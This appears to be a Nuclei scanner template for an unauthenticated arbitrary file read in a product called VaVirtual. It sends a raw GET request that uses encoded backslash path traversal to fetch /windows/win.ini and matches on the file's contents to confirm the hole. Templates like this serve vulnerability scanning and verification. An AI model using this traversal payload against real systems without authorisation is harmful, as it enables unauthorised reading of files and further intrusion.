id: VaVirtual-ReadAnyFile

info:
  author: iSee857
  name: VaVirtual-ReadAnyFile
  severity: high
  description: VaVirtual-ReadAnyFile
  reference:
    - https://github.com/iSee857
  tags: unauth,admin-panel,yuanchuang

requests:
  - method: GET
    raw:
      - |
        GET /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini HTTP/1.1
        Host: {{Host}}
        Accept: */*
        Connection: close

    matchers:
      - type: word
        words:
          - "font"
          - "16" 
        condition: and
        part: body

      - type: status
        status:
          - 200

    matchers-condition: and
    redirects: true
    max-redirects: 2